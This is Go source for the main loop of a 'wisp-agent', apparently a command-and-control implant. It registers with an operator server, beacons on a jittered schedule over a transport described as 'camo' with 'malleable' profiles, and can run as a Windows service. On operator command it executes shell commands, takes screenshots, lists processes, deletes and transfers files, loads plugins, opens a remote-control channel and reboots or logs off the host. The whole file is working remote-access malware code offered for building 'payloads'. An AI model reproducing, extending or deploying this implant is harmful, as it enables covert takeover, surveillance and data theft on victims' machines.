// wisp-agent M0: register -> beacon(checkin/poll) -> exec -> result.
// Config arrives as JSON today; the same struct is what §4 sentinel-patches
// into templates in M5.
package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"wispp/agent/config"
	"wispp/agent/transport"
	"wispp/protocol"
)

var (
	agentID  string
	rcpAddr  string
	rcpToken string

	rcpCtl    sync.Mutex
	rcpCancel context.CancelFunc
	rcpWanted bool
)

// rcpStart brings up the on-demand Type2 channel (plan §2.3): only after the
// operator opens remote control (CmdRCPConnect over Type1), never at boot.
func rcpStart(addr, token string) {
	if addr == "" {
		return
	}
	rcpCtl.Lock()
	rcpWanted = true
	if rcpCancel != nil {
		rcpCtl.Unlock()
		return
	}
	ctx, cancel := context.WithCancel(context.Background())
	rcpCancel = cancel
	rcpCtl.Unlock()
	go rcpLoop(ctx, addr, agentID, token)
}

func rcpStop() {
	rcpCtl.Lock()
	rcpWanted = false
	if rcpCancel != nil {
		rcpCancel()
		rcpCancel = nil
	}
	rcpCtl.Unlock()
}

func rcpIsWanted() bool {
	rcpCtl.Lock()
	defer rcpCtl.Unlock()
	return rcpWanted
}

func main() {
	cfgPath := flag.String("config", "agent.json", "config file (patched-in for built payloads)")
	service := flag.Bool("service", false, "run as a Windows service (register with sc create)")
	flag.Parse()

	cfg, err := config.LoadForAgent(*cfgPath)
	if err != nil {
		log.Fatalf("agent: %v", err)
	}
	if *service {
		if err := runAsService(func() error { return runAgent(cfg) }); err != nil {
			log.Fatalf("agent: service: %v", err)
		}
		return
	}
	if err := runAgent(cfg); err != nil {
		log.Fatalf("agent: %v", err)
	}
}

// runAgent is shared by the exe, the service host and the DLL export. It
// returns nil only on an orderly operator-requested exit.
func runAgent(cfg *config.Config) error {
	agentID = newAgentID()
	agentPluginPubkey = cfg.PluginPubkey

	tr, err := transport.New(cfg.Servers, cfg.Profile, cfg.Insecure)
	if err != nil {
		return err
	}
	sk, err := register(tr, cfg)
	if err != nil {
		return fmt.Errorf("register: %w", err)
	}
	log.Printf("agent %s registered (session %x…)", agentID, sk.ID[:4])

	start := time.Now()
	var seq uint64
	var fails int
	for {
		seq++
		task, err := checkin(tr, cfg, sk, seq, time.Since(start))
		if err != nil {
			if strings.Contains(err.Error(), "camo 404") {
				fails = 0 // HTTP says outright the session is gone
			} else {
				fails++
				log.Printf("agent: checkin failed (%d): %v", fails, err)
			}
			if fails == 0 || fails >= 3 {
				// session lost (server restart / record deleted) or the
				// transport is dead (TCP has no camo signal): re-handshake
				fails = 0
				wanted := rcpIsWanted()
				rcpStop() // drop stale Type2 creds; re-ack will refresh addr/token
				rcpAddr, rcpToken = "", ""
				log.Printf("agent: session lost, re-registering")
				if sk, err = register(tr, cfg); err != nil {
					log.Printf("agent: re-register failed: %v", err)
				} else if wanted {
					rcpStart(rcpAddr, rcpToken)
				}
			}
		} else {
			fails = 0
		}
		if task != nil {
			if quit := runTask(tr, cfg, &sk, task); quit {
				log.Printf("agent: exiting on operator command")
				return nil
			}
		}
		beacon := time.Duration(config.EffectiveSleep(cfg.SleepMS, cfg.JitterPct)) * time.Millisecond
		time.Sleep(beacon)
	}
}

// registerNonce is a fresh anti-replay nonce per RegisterInfo (plan P6).
func registerNonce() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func register(tr transport.Sender, cfg *config.Config) (*protocol.SessionKey, error) {
	pub, err := tr.Pubkey()
	if err != nil {
		return nil, err
	}
	sk, err := protocol.NewSessionKey()
	if err != nil {
		return nil, err
	}
	wrapped, err := protocol.WrapSessionKey(pub, sk)
	if err != nil {
		return nil, err
	}
	env, err := protocol.NewPlainEnvelope(protocol.MsgRegister, agentID, protocol.RegisterInfo{
		Agent:      agentID,
		System:     sysinfo(),
		WrappedKey: wrapped,
		PSKProof:   protocol.PSKProof(cfg.PSK, agentID, sk.ID[:]),
		Caps:       agentCaps(),
		TS:         time.Now().Unix(),
		Nonce:      registerNonce(),
		Proto:      protocol.ProtocolVersion,
	})
	if err != nil {
		return nil, err
	}
	resp, err := tr.Send(env)
	if err != nil {
		return nil, err
	}
	var ack protocol.RegisterAck
	if err := resp.DecodePlain(&ack); err != nil {
		return nil, err
	}
	if !ack.OK {
		return nil, fmt.Errorf("rejected by server (%s)", ack.Reason)
	}
	if drift := time.Now().Unix() - ack.ServerNow; drift > 60 || drift < -60 {
		log.Printf("agent: clock drift %+ds vs server (session timing uses server as reference)", drift)
	}
	rcpAddr, rcpToken = ack.RCPAddr, ack.RPCToken
	// Server-side profile wins for timing defaults (plan §2.2 malleable defaults).
	if ack.SleepMS > 0 {
		cfg.SleepMS = ack.SleepMS
		cfg.JitterPct = ack.JitterPct
	}
	return sk, nil
}

func checkin(tr transport.Sender, cfg *config.Config, sk *protocol.SessionKey, seq uint64, uptime time.Duration) (*protocol.Task, error) {
	env, err := protocol.NewSealedEnvelopeZstd(protocol.MsgCheckin, agentID, sk,
		protocol.Heartbeat{Seq: seq, UptimeMS: uptime.Milliseconds()}, zstdOn(cfg))
	if err != nil {
		return nil, err
	}
	resp, err := tr.Send(env)
	if err != nil {
		return nil, err
	}
	var task *protocol.Task
	if err := resp.OpenSealed(sk, &task); err != nil {
		return nil, err
	}
	return task, nil
}

// zstdOn reports whether the baked profile asks for envelope compression
// (plan P6); the sealed inner JSON is compressed before encryption.
func zstdOn(cfg *config.Config) bool { return cfg.Profile != nil && cfg.Profile.Zstd }

func postResult(tr transport.Sender, cfg *config.Config, sk *protocol.SessionKey, res protocol.TaskResult) {
	env, err := protocol.NewSealedEnvelopeZstd(protocol.MsgResult, agentID, sk, res, zstdOn(cfg))
	if err != nil {
		log.Printf("agent: seal result: %v", err)
		return
	}
	if _, err := tr.Send(env); err != nil {
		log.Printf("agent: post result: %v", err)
	}
}

func fill(id string, r protocol.TaskResult) protocol.TaskResult {
	r.TaskID = id
	return r
}

// runTask dispatches Task by protocol.Cmd* id (constants.go). Unknown ids are
// refused without executing anything. Returns true when the agent should stop.
func runTask(tr transport.Sender, cfg *config.Config, sk **protocol.SessionKey, task *protocol.Task) (quit bool) {
	res := protocol.TaskResult{TaskID: task.ID, OK: true}
	switch task.Cmd {
	case protocol.CmdRekey:
		log.Printf("agent: rotating session key (operator rekey)")
		nsk, err := register(tr, cfg)
		if err != nil {
			log.Printf("agent: rekey failed: %v (keeping old key)", err)
			res.OK, res.Output = false, "rekey failed: "+err.Error()
			break
		}
		*sk = nsk
		res.Output = fmt.Sprintf("rekeyed session key %x…", nsk.ID[:4])
	case protocol.CmdShell:
		var a protocol.ShellArgs
		if err := json.Unmarshal(task.Args, &a); err != nil {
			res.OK, res.Output = false, "bad args: "+err.Error()
			break
		}
		out, exit, err := runShell(a)
		res.Exit = exit
		if err != nil && out == "" {
			res.OK, res.Output = false, err.Error()
		} else {
			res.Output = out
		}
	case protocol.CmdSysinfo:
		b, _ := json.Marshal(sysinfo())
		res.Output, res.OK = string(b), true
	case protocol.CmdPwd:
		res = fill(res.TaskID, cmdPwd())
	case protocol.CmdLsJSON:
		res = fill(res.TaskID, cmdLs(task.Args))
	case protocol.CmdMkdir:
		res = fill(res.TaskID, cmdMkdir(task.Args))
	case protocol.CmdRm:
		res = fill(res.TaskID, cmdRm(task.Args))
	case protocol.CmdScreenshot:
		res = fill(res.TaskID, cmdScreenshot())
	case protocol.CmdPs:
		res = fill(res.TaskID, cmdPs())
	case protocol.CmdXferServe:
		var xa protocol.XferServeArgs
		if err := json.Unmarshal(task.Args, &xa); err != nil || xa.Path == "" {
			res = fill(res.TaskID, fail(fmt.Errorf("bad xfer serve args")))
			break
		}
		addr, err := xferServe(&xa, cfg.PSK)
		if err != nil {
			res = fill(res.TaskID, fail(err))
		} else {
			res = fill(res.TaskID, xferResult(protocol.XferServeResult{Addr: addr}))
		}
	case protocol.CmdXferFetch:
		var xa protocol.XferFetchArgs
		if err := json.Unmarshal(task.Args, &xa); err != nil || xa.Addr == "" || xa.Local == "" {
			res = fill(res.TaskID, fail(fmt.Errorf("bad xfer fetch args")))
			break
		}
		fr, err := xferFetch(&xa, cfg.PSK)
		if err != nil {
			res = fill(res.TaskID, fail(err))
		} else {
			res = fill(res.TaskID, xferResult(fr))
		}
	case protocol.CmdP2PBridge:
		var a protocol.P2PBridgeArgs
		if err := json.Unmarshal(task.Args, &a); err != nil || a.Offer == "" {
			res = fill(res.TaskID, fail(fmt.Errorf("bad p2p args")))
			break
		}
		ans, err := p2pBridge(&a, cfg.PSK)
		if err != nil {
			res = fill(res.TaskID, fail(err))
		} else {
			res = fill(res.TaskID, ok1(string(mustMarshal(ans))))
		}
	case protocol.CmdP2PStop:
		p2pStop()
		res = fill(res.TaskID, ok1("p2p down"))
	case protocol.CmdRCPConnect:
		var a struct {
			Addr  string `json:"addr"`
			Token string `json:"token"`
		}
		_ = json.Unmarshal(task.Args, &a)
		addr, tok := a.Addr, a.Token
		if addr == "" {
			addr, tok = rcpAddr, rcpToken
		}
		if addr == "" {
			res = fill(res.TaskID, fail(fmt.Errorf("no Type2 address known (create an rcp listener)")))
			break
		}
		rcpStart(addr, tok)
		res = fill(res.TaskID, ok1("dialing "+addr))
	case protocol.CmdRCPDisconnect:
		rcpStop()
		res = fill(res.TaskID, ok1("type2 down"))
	case protocol.CmdPluginLoad:
		var a protocol.PluginLoadArgs
		if err := json.Unmarshal(task.Args, &a); err != nil {
			res = fill(res.TaskID, fail(err))
			break
		}
		out, err := pluginLoad(&a)
		if err != nil {
			res = fill(res.TaskID, fail(err))
		} else {
			res = fill(res.TaskID, ok1(out))
		}
	case protocol.CmdPluginExec:
		var a protocol.PluginExecArgs
		if err := json.Unmarshal(task.Args, &a); err != nil {
			res = fill(res.TaskID, fail(err))
			break
		}
		out, err := pluginExec(&a)
		if err != nil {
			res = fill(res.TaskID, fail(err))
		} else {
			res = fill(res.TaskID, ok1(out))
		}
	case protocol.CmdHostReboot, protocol.CmdHostShutdown, protocol.CmdHostLogoff, protocol.CmdHostLock:
		res = fill(res.TaskID, cmdHost(task.Cmd))
	case protocol.CmdSleep:
		var a protocol.SleepArgs
		if err := json.Unmarshal(task.Args, &a); err != nil {
			res.OK, res.Output = false, "bad args: "+err.Error()
			break
		}
		if a.SleepMS >= protocol.MinSleepMS {
			cfg.SleepMS = a.SleepMS
		}
		if a.JitterPct >= 0 && a.JitterPct <= protocol.MaxJitterPct {
			cfg.JitterPct = a.JitterPct
		}
		res.Output = fmt.Sprintf("sleep=%dms jitter=%d%%", cfg.SleepMS, cfg.JitterPct)
	case protocol.CmdExit, protocol.CmdClientKill:
		postResult(tr, cfg, *sk, res) // synchronous: server marks us offline on this ack
		return true
	default:
		res.OK, res.Output = false, fmt.Sprintf("cmd %d not implemented", task.Cmd)
	}
	postResult(tr, cfg, *sk, res)
	return false
}

func runShell(a protocol.ShellArgs) (string, int, error) {
	cmd := shellCommand(a.Command)
	timeout := time.Duration(a.TimeoutMS) * time.Millisecond
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	done := make(chan struct{})
	var out []byte
	var err error
	go func() {
		out, err = cmd.CombinedOutput()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(timeout):
		_ = cmd.Process.Kill()
		return string(out), -1, fmt.Errorf("timeout after %s", timeout)
	}
	exit := 0
	if cmd.ProcessState != nil {
		exit = cmd.ProcessState.ExitCode()
	}
	outStr := string(out)
	if len(outStr) > 1<<20 { // keep results bounded on Type1 (Type3 carries bulk, plan §2.4)
		outStr = outStr[:1<<20] + "\n…[truncated]"
	}
	return outStr, exit, err
}

// agentCaps is advertised at registration so the console can hide actions the
// agent cannot serve (and the future feature-DLL loader can negotiate).
func agentCaps() []string {
	return []string{"rcp", "view", "file", "plugin-wasm"}
}

func sysinfo() protocol.SystemInfo {
	host, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	exe, _ := os.Executable()
	return protocol.SystemInfo{
		Hostname: host, OS: runtime.GOOS, Arch: runtime.GOARCH,
		User: user, PID: os.Getpid(), Process: exe,
		AgentVer: "v2.0-m5", InternalIP: localIP(),
	}
}

func newAgentID() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
